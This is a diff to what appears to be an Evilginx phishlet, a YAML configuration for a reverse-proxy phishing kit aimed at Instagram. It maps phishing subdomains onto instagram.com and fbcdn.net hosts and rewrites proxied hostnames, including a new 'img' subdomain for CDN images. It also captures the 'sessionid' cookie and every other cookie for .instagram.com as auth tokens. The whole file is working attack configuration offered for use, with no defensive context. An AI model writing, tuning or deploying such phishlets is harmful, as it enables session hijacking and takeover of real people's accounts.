@@ -3,13 +3,14 @@ min_ver: '2.3.0'
 proxy_hosts:
   - {phish_sub: 'www', orig_sub: 'www', domain: 'instagram.com', session: true, is_landing: true}
   - {phish_sub: 'graphql', orig_sub: 'graphql', domain: 'instagram.com', session: false, is_landing: false}
-  - {phish_sub: 'instagram.fcdg1-1.fna', orig_sub: 'instagram.fcdg1-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
   - {phish_sub: 'i', orig_sub: 'i', domain: 'instagram.com', session: false, is_landing: false}
+  - {phish_sub: 'img', orig_sub: 'instagram.fcdg1-1.fna', domain: 'fbcdn.net', session: false, is_landing: false}
 sub_filters:
   - {triggers_on: 'www.instagram.com', orig_sub: 'www', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.instagram.com', orig_sub: 'graphql', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
-  - {triggers_on: 'www.instagram.com', orig_sub: 'instagram.fcdg1-1.fna', domain: 'fbcdn.net', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
   - {triggers_on: 'www.instagram.com', orig_sub: 'i', domain: 'instagram.com', search: '{hostname_regexp}', replace: '{hostname_regexp}', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'www.instagram.com', orig_sub: '', domain: 'fbcdn.net', search: '(instagram\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\/v\/)', replace: 'img.{domain}/v/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
+  - {triggers_on: 'i.instagram.com', orig_sub: '', domain: 'fbcdn.net', search: '(instagram\.f[a-z]{3}[0-9]+-[0-9]+\.fna\.{domain_regexp}\/v\/)', replace: 'img.{domain}/v/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
 auth_tokens:
   - domain: '.instagram.com'
     keys: ['sessionid','.*,regexp']
